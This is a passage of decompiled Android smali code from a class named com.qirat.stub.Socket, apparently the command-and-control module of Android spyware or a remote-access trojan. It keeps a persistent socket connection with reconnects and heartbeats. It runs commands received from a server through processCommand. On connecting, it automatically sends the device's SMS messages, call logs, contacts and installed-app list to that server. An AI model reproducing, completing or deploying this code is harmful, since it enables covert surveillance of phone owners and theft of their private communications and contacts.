    iput-boolean v0, p0, Lcom/qirat/stub/Socket;->isConnected:Z

    .line 105
    invoke-direct {p0}, Lcom/qirat/stub/Socket;->reconnect()V

    .line 107
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method synthetic lambda$reconnect$5$com-qirat-stub-Socket()V
    .locals 3

    .line 290
    const-string v0, "SocketManager"

    const-wide/16 v1, 0x1388

    :try_start_0
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    .line 291
    const-string v1, "Attempting to reconnect..."

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 292
    invoke-virtual {p0}, Lcom/qirat/stub/Socket;->connect()V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 295
    goto :goto_0

    .line 293
    :catch_0
    move-exception v1

    .line 294
    .local v1, "e":Ljava/lang/InterruptedException;
    const-string v2, "Reconnect interrupted"

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 296
    .end local v1    # "e":Ljava/lang/InterruptedException;
    :goto_0
    return-void
.end method

.method synthetic lambda$sendData$4$com-qirat-stub-Socket(Ljava/lang/String;)V
    .locals 4
    .param p1, "data"    # Ljava/lang/String;

    .line 276
    const-string v0, "SocketManager"

    :try_start_0
    iget-object v1, p0, Lcom/qirat/stub/Socket;->writer:Ljava/io/PrintWriter;

    invoke-virtual {v1, p1}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V

    .line 277
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Sent: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 280
    goto :goto_0

    .line 278
    :catch_0
    move-exception v1

    .line 279
    .local v1, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Send error: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 281
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method synthetic lambda$sendInitialData$2$com-qirat-stub-Socket()V
    .locals 4

    .line 156
    const-string v0, "SocketManager"

    const-wide/16 v1, 0x3e8

    :try_start_0
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    .line 158
    const-string v1, "Sending initial data automatically..."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 161
    iget-object v1, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    invoke-static {v1}, Lcom/qirat/stub/SMSManager;->sendSMSListToServer(Landroid/content/Context;)V

    .line 162
    const-wide/16 v1, 0x1f4

    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    .line 165
    iget-object v3, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    invoke-static {v3}, Lcom/qirat/stub/CallsManager;->sendCallLogsToServer(Landroid/content/Context;)V

    .line 166
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    .line 169
    iget-object v3, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    invoke-static {v3}, Lcom/qirat/stub/ContactsManager;->sendContactsToServer(Landroid/content/Context;)V

    .line 170
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    .line 173
    iget-object v1, p0, Lcom/qirat/stub/Socket;->context:Landroid/content/Context;

    invoke-static {v1}, Lcom/qirat/stub/ApplicationManager;->sendApplicationsListToServer(Landroid/content/Context;)V

    .line 175
    const-string v1, "Initial data sent successfully"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 179
    goto :goto_0

    .line 177
    :catch_0
    move-exception v1

    .line 178
    .local v1, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error sending initial data: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 180
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method synthetic lambda$startHeartbeat$1$com-qirat-stub-Socket()V
    .locals 3

    .line 117
    nop

    :goto_0
    :try_start_0
    iget-boolean v0, p0, Lcom/qirat/stub/Socket;->isConnected:Z

    if-eqz v0, :cond_0

    .line 118
    const-string v0, "PING"

    invoke-virtual {p0, v0}, Lcom/qirat/stub/Socket;->sendData(Ljava/lang/String;)V

    .line 119
    const-wide/16 v0, 0x1388

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 123
    :cond_0
    goto :goto_1

    .line 121
    :catch_0
    move-exception v0

    .line 122
    .local v0, "e":Ljava/lang/InterruptedException;
    const-string v1, "SocketManager"

    const-string v2, "Heartbeat interrupted"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 124
    .end local v0    # "e":Ljava/lang/InterruptedException;
    :goto_1
    return-void
.end method

.method synthetic lambda$startReceiving$3$com-qirat-stub-Socket()V
    .locals 5

    .line 190
    const-string v0, "SocketManager"

    :goto_0
    const/4 v1, 0x0

    :try_start_0
    iget-boolean v2, p0, Lcom/qirat/stub/Socket;->isConnected:Z

    if-eqz v2, :cond_1

    iget-object v2, p0, Lcom/qirat/stub/Socket;->reader:Ljava/io/BufferedReader;

    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    move-object v3, v2

    .local v3, "line":Ljava/lang/String;
    if-eqz v2, :cond_1

    .line 191
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Received: "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 192
    iget-object v2, p0, Lcom/qirat/stub/Socket;->dataListener:Lcom/qirat/stub/Socket$OnDataReceivedListener;

    if-eqz v2, :cond_0

    .line 193
    iget-object v2, p0, Lcom/qirat/stub/Socket;->dataListener:Lcom/qirat/stub/Socket$OnDataReceivedListener;

    invoke-interface {v2, v3}, Lcom/qirat/stub/Socket$OnDataReceivedListener;->onDataReceived(Ljava/lang/String;)V

    .line 195
    :cond_0
    invoke-direct {p0, v3}, Lcom/qirat/stub/Socket;->processCommand(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    .line 200
    .end local v3    # "line":Ljava/lang/String;
    :cond_1
    nop

    :goto_1
    iput-boolean v1, p0, Lcom/qirat/stub/Socket;->isConnected:Z

    .line 201
    invoke-direct {p0}, Lcom/qirat/stub/Socket;->reconnect()V

    .line 202
    goto :goto_2

    .line 200
    :catchall_0
    move-exception v0

    goto :goto_3

    .line 197
    :catch_0
    move-exception v2

    .line 198
    .local v2, "e":Ljava/lang/Exception;
    :try_start_1
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Receiver error: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 200
    nop

    .end local v2    # "e":Ljava/lang/Exception;
    goto :goto_1

    .line 203
    :goto_2
    return-void

    .line 200
    :goto_3
    iput-boolean v1, p0, Lcom/qirat/stub/Socket;->isConnected:Z

    .line 201
    invoke-direct {p0}, Lcom/qirat/stub/Socket;->reconnect()V

    .line 202
    throw v0
.end method

.method public sendData(Ljava/lang/String;)V
    .locals 2
    .param p1, "data"    # Ljava/lang/String;

    .line 269
    iget-boolean v0, p0, Lcom/qirat/stub/Socket;->isConnected:Z

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/qirat/stub/Socket;->writer:Ljava/io/PrintWriter;

    if-nez v0, :cond_0

    goto :goto_0

    .line 274
    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/qirat/stub/Socket$$ExternalSyntheticLambda3;

    invoke-direct {v1, p0, p1}, Lcom/qirat/stub/Socket$$ExternalSyntheticLambda3;-><init>(Lcom/qirat/stub/Socket;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 281
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 282
    return-void

    .line 270
    :cond_1
    :goto_0
    const-string v0, "SocketManager"

    const-string v1, "Cannot send data, not connected"

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 271
    return-void
.end method

.method public setDataListener(Lcom/qirat/stub/Socket$OnDataReceivedListener;)V
    .locals 0
    .param p1, "listener"    # Lcom/qirat/stub/Socket$OnDataReceivedListener;

    .line 325
    iput-object p1, p0, Lcom/qirat/stub/Socket;->dataListener:Lcom/qirat/stub/Socket$OnDataReceivedListener;

    .line 326
    return-void
.end method
